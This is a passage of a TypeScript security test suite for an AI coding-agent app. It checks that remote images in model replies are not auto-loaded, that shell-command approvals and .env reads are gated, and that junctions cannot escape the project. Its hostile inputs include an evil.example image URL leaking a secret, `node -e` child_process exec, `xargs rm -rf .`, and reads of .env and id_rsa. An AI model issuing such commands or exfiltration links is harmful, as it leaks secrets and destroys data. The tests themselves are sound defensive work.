    const options = { links: { imageTip: "Preview", remoteImage: "Click to load image" }, paths: { tip: "Open" } }
    const html = (source: string) =>
      renderReply(source, options)
        .map((block) => (block.kind === "html" ? block.html : ""))
        .join("\n")
    const exfil = html("Done. ![](https://evil.example/pixel.png?d=the-users-secret)")
    check("a web picture is not drawn as a picture", !/<img\b/i.test(exfil), exfil.slice(0, 120))
    check("...but as a placeholder naming its host", /data-remote-src="https:\/\/evil\.example\/pixel\.png\?d=the-users-secret"/.test(exfil) && exfil.includes("evil.example</span>"))
    const linked = html("[chart](https://evil.example/chart.png?d=x)")
    check("a link to a picture waits too", !/<img\b/i.test(linked) && linked.includes("md-img-remote md-img-link"))
    const protocolRelative = html("![x](//evil.example/p.png)")
    check("a protocol-relative picture is never drawn", !/<img\b/i.test(protocolRelative))
    check("an inline picture is drawn at once", /<img class="md-img" src="data:image\/png;base64,/.test(html("![dot](data:image/png;base64,iVBORw0KGgo=)")))
    check("a picture on this machine is still a local card", /data-media-path="\/tmp\/shot\.png"/.test(html("![](/tmp/shot.png)")))
    const svg = renderReply("```svg\n<svg><image href=\"https://evil.example/p.png\"/></svg>\n```", { ...options, diagrams: { streaming: false } })
    // What a drawing may fetch is decided when it is drawn (svg-safe.ts), and mdcheck replays those cases.
    check("a drawing is handed over as source, not as markup", svg.some((block) => block.kind === "diagram") && !svg.some((block) => block.kind === "html" && block.html.includes("evil.example")))
    const textPart = await fs.readFile(path.join(process.cwd(), "src/renderer/src/components/parts/TextPart.vue"), "utf8").catch(() => "")
    check("the reply view swaps a placeholder for its picture only on a click", /closest<HTMLElement>\("\[data-remote-src\]"\)[\s\S]{0,200}allowRemoteImage\(/.test(textPart))
  }

  section("Round 8 (E11): video card lookups can be switched off")
  {
    const link = "https://www.bilibili.com/video/BV1xx411c7mD"
    const card = linkOnlyCard(link)
    check("a card can be made from the link alone", card?.platform === "bilibili" && card.title === "" && card.coverUrl === "", card)
    check("a link to no platform makes no card", linkOnlyCard("https://example.com/watch") === null)
    // The window's own path, with no bridge to reach: switched off, it must not need one.
    const cards = await enrichMedia([link, "https://www.youtube.com/watch?v=dQw4w9WgXcQ"], false).catch((err: unknown) => String(err))
    check("switched off, the window draws the cards without asking the main process", Array.isArray(cards) && cards.length === 2 && cards.every((meta) => !meta.title && !meta.coverUrl), cards)
    const main = await fs.readFile(path.join(process.cwd(), "src/main/media-embed.ts"), "utf8").catch(() => "")
    const index = await fs.readFile(path.join(process.cwd(), "src/main/index.ts"), "utf8").catch(() => "")
    check("the main process answers link-only cards when it is off", /if \(!detailsOn\(\)\) return list\.map\(linkOnlyCard\)/.test(main))
    check("...and the cover proxy fetches nothing when it is off", /detailsOn\(\) \? serveCover\([\s\S]*?: new Response\(null, \{ status: 404 \}\)/.test(main))
    check("the switch it reads is the setting, on unless turned off", /registerMediaEmbeds\(\(\) => backend\?\.runtime\.config\.get\(\)\.videoCardDetails !== false\)/.test(index))
    const data = path.join(root, "e11-data")
    await fs.mkdir(path.join(data, "storage"), { recursive: true })
    await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
    const backend = await startBackend(data)
    check("a new profile has the lookups on", backend.runtime.config.get().videoCardDetails !== false)
    await backend.close()
  }
}


// --------------------------------------------------------------- X6, X7
async function approvalChecks(check: Check, section: Section, root: string): Promise<void> {
  section('Round 8 (X6): an "always" keeps no more than was approved')
  const project = path.join(root, "x6-project")
  await fs.mkdir(project, { recursive: true })
  const alwaysOf = async (command: string) => (await scanCommand(command, project, project, false)).always
  check("an interpreter's always keeps its script", (await alwaysOf("node build.js --prod")).join() === "node build.js *", await alwaysOf("node build.js --prod"))
  check("inline code is remembered only exactly", (await alwaysOf('node -e "console.log(1)"')).join() === 'node -e "console.log(1)"', await alwaysOf('node -e "console.log(1)"'))
  check("so is python -c", (await alwaysOf("python -c 'print(1)'")).join() === "python -c 'print(1)'")
  check("inline code holding a wildcard character is not remembered at all", (await alwaysOf('node -e "a*b"')).length === 0)
  check("MiMo's arities are unchanged elsewhere", (await alwaysOf("npm run build")).join() === "npm run build *" && (await alwaysOf("myscript a")).join() === "myscript *")

  const dataRoot = path.join(root, "x6-data")
  const storage = new Storage(path.join(dataRoot, "storage"))
  const bus = new Bus()
  const config = new Config(storage, bus, path.join(dataRoot, "credentials.json"))
  await storage.write("config", {})
  await config.load()
  await config.set({ accessLevel: "ask", permissions: { bash: "ask" } })
  const gate = new Permissions(bus, config)
  const pause = () => new Promise((resolve) => setTimeout(resolve, 20))
  const settle = async (running: Promise<string>, answer: "always" | "reject") => {
    await pause()
    const parked = gate.outstanding()[0]
    if (parked) gate.respond(parked.id, answer)
    return { asked: Boolean(parked), outcome: await running }
  }
  const attempt = (sessionID: string, subject: string, patterns: string[], always: string[], patternAsks = false) =>
    gate
      .ask({ sessionID, messageID: "m", callID: `c${Math.random()}`, kind: "bash", title: "t", subject, patterns, always, directory: project, patternAsks })
      .then(
        () => "allowed",
        (err: Error) => `refused: ${err.message.slice(0, 30)}`,
      )
  const ask = async (sessionID: string, command: string, answer: "always" | "reject") => {
    const scan = await scanCommand(command, project, project, false)
    return settle(attempt(sessionID, command, scan.patterns, scan.always, namesAskingFile(command)), answer)
  }
  await ask("ses_x6", "node build.js", "always")
  const again = await ask("ses_x6", "node build.js --watch", "reject")
  check("the approved script runs again unasked", !again.asked && again.outcome === "allowed", again)
  const payload = await ask("ses_x6", "node -e \"require('child_process').exec('calc')\"", "reject")
  check("but node -e with anything in it is asked", payload.asked, payload)

  // A background subagent and a remembered prefix.
  await settle(attempt("ses_x6", "xargs echo", ["xargs echo"], ["xargs *"]), "always")
  gate.markBackground("ses_bg", "ses_x6")
  const risky = await settle(attempt("ses_bg", "xargs rm -rf .", ["xargs rm -rf ."], ["xargs *"]), "reject")
  check("a background subagent does not ride a remembered prefix into a dangerous command", !risky.asked && risky.outcome.startsWith("refused"), risky)
  const benign = await settle(attempt("ses_bg", "node build.js", ["node build.js"], ["node build.js *"]), "reject")
  check("...while an ordinary remembered command still runs there", benign.outcome === "allowed", benign)
  gate.markBackground("ses_bg", undefined)

  section("Round 8 (X7): the read-only allowlist no longer reads past the project or into .env")
  const outside = path.join(root, "x7-outside")
  await fs.mkdir(outside, { recursive: true })
  const grep = await scanCommand(`grep -r token "${outside}"`, project, project, false)
  check("grep naming a folder outside the project puts it up for the outside question", grep.dirs.some((dir) => path.resolve(dir) === path.resolve(outside)), grep.dirs)
  const typed = await scanCommand(`Get-Content "${path.join(outside, "id_rsa")}"`, project, project, true)
  check("so does a PowerShell read", typed.dirs.some((dir) => path.resolve(dir) === path.resolve(outside)), typed.dirs)
  check("a head of a file inside the project asks nothing extra", (await scanCommand("head -n 5 src/app.ts", project, project, false)).dirs.length === 0)
  check("a .env named on a command line is recognised", namesAskingFile("type .env") && namesAskingFile('cat "C:\\p\\.env.local"') && !namesAskingFile("cat .env.example") && !namesAskingFile("cat notes.md"))
  const envRead = await ask("ses_x7", "cat .env", "reject")
  check("reading .env through the allowlist is asked", envRead.asked, envRead)
  const plainRead = await ask("ses_x7", "cat README.md", "reject")
  check("reading an ordinary file through it is not", !plainRead.asked && plainRead.outcome === "allowed", plainRead)
  await config.set({ accessLevel: "auto" })
  const autoEnv = await ask("ses_x7b", "cat .env", "reject")
  check("at the middle level a .env on the command line is not waved through", autoEnv.outcome !== "allowed", autoEnv)
  check("the command parser still reads the line the same way", simpleCommands("cat .env", false)[0]?.tokens.join(" ") === "cat .env")
}

/** A GET to the preview server as a page there would make it, answering the status and the headers. */
function previewGet(url: string, file: string): Promise<{ status: number; headers: Record<string, unknown> }> {
  const parsed = new URL(url)
  return new Promise((resolve) => {
    const request = httpGet(
      { host: "127.0.0.1", port: Number(parsed.port), path: `/${file}`, headers: { host: parsed.host } },
      (response) => {
        response.resume()
        resolve({ status: response.statusCode ?? 0, headers: response.headers })
      },
    )
    request.on("error", () => resolve({ status: 0, headers: {} }))
  })
}

// ------------------------------------------------------------------- X9
async function junctionChecks(check: Check, section: Section, root: string): Promise<void> {
  section("Round 8 (X9): a junction inside a folder is no way out of it")
  const project = path.join(root, "x9-project")
  const outside = path.join(root, "x9-outside")
  await fs.mkdir(project, { recursive: true })
  await fs.mkdir(outside, { recursive: true })
  await fs.writeFile(path.join(outside, "secret.txt"), "outside")
  await fs.writeFile(path.join(project, "page.html"), "<p>x</p>")
  const link = path.join(project, "door")
  if (!(await fs.symlink(outside, link, "junction").then(() => true, () => false))) {
    check("a junction can be made for the test", false)
    return
  }
  const data = path.join(root, "x9-data")
  await fs.mkdir(path.join(data, "storage"), { recursive: true })
  await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
  const backend = await startBackend(data)
  try {
    const ask = (request: Record<string, unknown>) =>
      handle(backend.runtime, request as unknown as Request).then(
        (value) => ({ ok: true, value }),
        (err: unknown) => ({ ok: false, value: err instanceof Error ? err.message : String(err) }),
      )
    const listed = await ask({ type: "file.listDir", directory: project, sub: "door", all: true })
    check("the files tab does not list a folder through a junction", !listed.ok, listed)
    const searched = await ask({ type: "file.search", directory: project, query: "secret", sub: "door" })
    check("nor search one", !searched.ok, searched)
    const plain = await ask({ type: "file.listDir", directory: project, all: true })
    check("the project itself still lists, the junction shown as an entry", plain.ok && JSON.stringify(plain.value).includes("door"), plain.ok)
  } finally {
    await backend.close()
  }
  const cwd = await resolveInsideReal(project, "door").then(() => "allowed", (err: Error) => err.message)
  check("a terminal cannot be opened through it", cwd.startsWith("Path leads outside"), cwd)
  check("an ordinary subfolder still can", (await resolveInsideReal(project, ".").catch(() => "")) === path.resolve(project))
  const handlers = await fs.readFile(path.join(process.cwd(), "src/server/handlers.ts"), "utf8").catch(() => "")
  const main = await fs.readFile(path.join(process.cwd(), "src/main/index.ts"), "utf8").catch(() => "")
  check("the terminal's folder is checked by where it leads", /request\.cwd \? await resolveInsideReal\(group\.directory, request\.cwd\)/.test(handlers))
  check("open-file and reveal-file check by where the file leads", /await insideReal\(root, target\)/.test(main) && (main.match(/await inside\(directory, relative\)/g) ?? []).length === 2)

  const served = await servePreview(path.join(project, "page.html"))
  if (!served.ok) {
    check("the preview server serves the page", false, served)
    return
  }
  const page = await previewGet(served.url, "page.html")
  check("the preview server serves the page", page.status === 200, page.status)
  const escaped = await previewGet(served.url, "door/secret.txt")
  check("but not a file reached through a junction in its folder", escaped.status === 403, escaped.status)

  section("Round 8 (X14): the preview server sends no Referer and no sniffing")
  check("pages go out with Referrer-Policy: no-referrer", page.headers["referrer-policy"] === "no-referrer", page.headers["referrer-policy"])
  check("and X-Content-Type-Options: nosniff", page.headers["x-content-type-options"] === "nosniff", page.headers["x-content-type-options"])
  const missing = await previewGet(served.url, "nothing.html")
  check("so do refusals", missing.status === 404 && missing.headers["referrer-policy"] === "no-referrer")
}